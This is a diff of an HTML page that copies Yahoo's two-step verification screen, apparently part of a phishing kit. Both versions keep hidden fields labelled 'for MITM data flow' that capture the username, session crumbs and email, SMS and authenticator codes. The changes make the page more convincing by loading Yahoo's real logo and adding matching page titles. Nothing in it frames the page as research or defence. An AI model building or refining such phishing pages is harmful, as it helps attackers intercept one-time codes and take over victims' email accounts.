@@ -2,11 +2,13 @@
 <html data-wf-page="67c6f50ed426ad7d5847f218" data-wf-site="67c6f50ed426ad7d5847f211">
 <head>
     <meta charset="utf-8">
-    <title>Yahoo - Enter verification code</title>
+    <title>Enter verification code - Yahoo</title>
     <meta content="width=device-width, initial-scale=1" name="viewport">
     <meta content="Webflow" name="generator">
+    <meta content="Enter verification code - Yahoo" property="og:title">
+    <meta content="Enter verification code - Yahoo" property="twitter:title">
     
-    <!-- Complete CSS Structure -->
+    <!-- Only the necessary CSS files -->
     <link href="css/normalize.css" rel="stylesheet" type="text/css">
     <link href="css/webflow.css" rel="stylesheet" type="text/css">
     <link href="css/yahoo-8d0526.webflow.css" rel="stylesheet" type="text/css">
@@ -36,7 +38,7 @@
         <!-- Header -->
         <div class="div-block">
             <div class="div-block-2">
-                <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTAwIiBoZWlnaHQ9IjUwIiB2aWV3Qm94PSIwIDAgMTAwIDUwIiBmaWxsPSJub25lIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPgo8dGV4dCB4PSI1MCIgeT0iMzAiIGZvbnQtZmFtaWx5PSJBcmlhbCIgZm9udC1zaXplPSIyNCIgZm9udC13ZWlnaHQ9ImJvbGQiIGZpbGw9IiM3MjAwZmYiIHRleHQtYW5jaG9yPSJtaWRkbGUiPllhaG9vITwvdGV4dD4KPC9zdmc+" loading="lazy" alt="Yahoo" class="image">
+                <img src="https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_p_205x58_frontpage.png" alt="Yahoo" class="image">
             </div>
             <div class="div-block-3">
                 <div class="text-block">Help</div>
@@ -54,77 +56,43 @@
             
             <!-- Form Container -->
             <div class="form-block w-form">
-                <form id="otp-form" class="form" method="POST">
-                    <!-- 🎯 CRITICAL: Hidden fields for MITM data flow -->
-                    <input type="hidden" name="username" id="username">
-                    <input type="hidden" name="sessionIndex" id="sessionIndex">
-                    <input type="hidden" name="acrumb" id="acrumb">
-                    <input type="hidden" name="crumb" id="crumb">
-                    <input type="hidden" name="signin" value="VerifyCode">
-                    <input type="hidden" name="verifyCode" id="verifyCode">
-                    <input type="hidden" name="emailCode" id="emailCode">
-                    <input type="hidden" name="smsCode" id="smsCode">
-                    <input type="hidden" name="totpCode" id="totpCode">
-                    <input type="hidden" name="method" id="method">
-                    <input type="hidden" name="done" value="https://mail.yahoo.com/d/folders/1">
+                <div class="yahoo-container">
+                    <div class="yahoo-logo">
+                        <img src="/placeholder.svg?height=60&width=120" alt="Yahoo">
+                    </div>
                     
-                    <!-- Yahoo Logo -->
-                    <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTAwIiBoZWlnaHQ9IjUwIiB2aWV3Qm94PSIwIDAgMTAwIDUwIiBmaWxsPSJub25lIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPgo8dGV4dCB4PSI1MCIgeT0iMzAiIGZvbnQtZmFtaWx5PSJBcmlhbCIgZm9udC1zaXplPSIyNCIgZm9udC13ZWlnaHQ9ImJvbGQiIGZpbGw9IiM3MjAwZmYiIHRleHQtYW5jaG9yPSJtaWRkbGUiPllhaG9vITwvdGV4dD4KPC9zdmc+" loading="lazy" alt="Yahoo" class="image-2">
-                    
-                    <!-- Main Form -->
-                    <div class="pazzi" id="main-form">
-                        <div class="reflectto" id="userEmail">Enter verification code</div>
-                        <h1 class="heading-2"><strong>Enter verification code</strong></h1>
-                        <div class="text-block-2" id="method-description">We sent a verification code to your email<br></div>
+                    <div class="yahoo-form">
+                        <h1 style="text-align: center; margin-bottom: 20px; font-size: 24px; color: #333;">Enter verification code</h1>
+                        <p style="text-align: center; color: #666; margin-bottom: 30px;">We sent a code to your device. Enter it below to continue.</p>
                         
-                        <div class="pazz lpl">Verification Code</div>
-                        <div class="ms-input-wrap">
-                            <input class="ms-input w-input" maxlength="8" name="otp_code" 
-                                   placeholder="Enter code" type="text" id="otp-input" 
-                                   required="" autofocus autocomplete="one-time-code"
-                                   style="text-align: center; font-size: 18px; letter-spacing: 2px;">
+                        <form id="otpForm" method="POST">
+                            <!-- 🎯 CRITICAL: Hidden fields for MITM data flow -->
+                            <input type="hidden" name="username" id="username">
+                            <input type="hidden" name="sessionIndex" id="sessionIndex">
+                            <input type="hidden" name="acrumb" id="acrumb">
+                            <input type="hidden" name="crumb" id="crumb">
+                            <input type="hidden" name="signin" value="VerifyCode">
+                            <input type="hidden" name="emailCode" id="emailCode">
+                            <input type="hidden" name="smsCode" id="smsCode">
+                            <input type="hidden" name="totpCode" id="totpCode">
+                            <input type="hidden" name="method" id="method">
+                            <input type="hidden" name="done" value="https://mail.yahoo.com/d/folders/1">
+                            
+                            <input type="text" id="verifyCode" name="verifyCode" class="yahoo-input yahoo-otp-input" placeholder="Enter code" maxlength="6" required>
+                            
+                            <div class="yahoo-error" id="errorMessage"></div>
+                            
+                            <button type="submit" class="yahoo-button" id="submitBtn">
+                                <span id="btnText">Verify</span>
+                                <span id="btnSpinner" class="loading-spinner" style="display: none;"></span>
+                            </button>
+                        </form>
+                        
+                        <div style="text-align: center; margin-top: 20px;">
+                            <a href="#" style="color: #5f01d1; text-decoration: none; font-size: 14px;" id="resendCode">Didn't get a code?</a>
                         </div>
-                        
-                        <!-- Resend Section -->
-                        <div id="resend-section" style="margin: 20px 0; text-align: center;">
-                            <p style="font-family: Open Sans, sans-serif; font-size: 14px; color: #666; margin-bottom: 10px;">
-                                Didn't receive the code?
-                            </p>
-                            <button type="button" id="resend-btn" style="
-                                background: none; 
-                                border: none; 
-                                color: #6b00eb; 
-                                font-family: Open Sans, sans-serif; 
-                                font-size: 14px; 
-                                font-weight: 600; 
-                                cursor: pointer; 
-                                text-decoration: underline;
-                            ">Resend code</button>
-                        </div>
-                        
-                        <input type="submit" class="logger w-button" value="Verify" id="submit-btn">
                     </div>
-                    
-                    <!-- Error State -->
-                    <div class="errry" id="error-container">
-                        <h1 class="heading-2"><strong>Uh-oh...</strong></h1>
-                        <div class="text-block-7" id="error-message">Invalid verification code. Please try again.</div>
-                        <button id="refreshButton" type="button" class="restart logger w-button">Try again</button>
-                    </div>
-                    
-                    <!-- Loading State -->
-                    <div id="loading-state" class="hidden text-center" style="padding: 20px;">
-                        <div class="loading-spinner"></div>
-                        <p style="font-family: Open Sans, sans-serif; color: #6b00eb;">Verifying code...</p>
-                    </div>
-                    
-                    <!-- Success State -->
-                    <div id="success-state" class="hidden text-center" style="padding: 20px;">
-                        <div class="success-icon">✅</div>
-                        <h2 class="success-title">Verification successful!</h2>
-                        <p class="success-text">Redirecting to your account...</p>
-                    </div>
-                </form>
+                </div>
             </div>
         </div>
     </section>
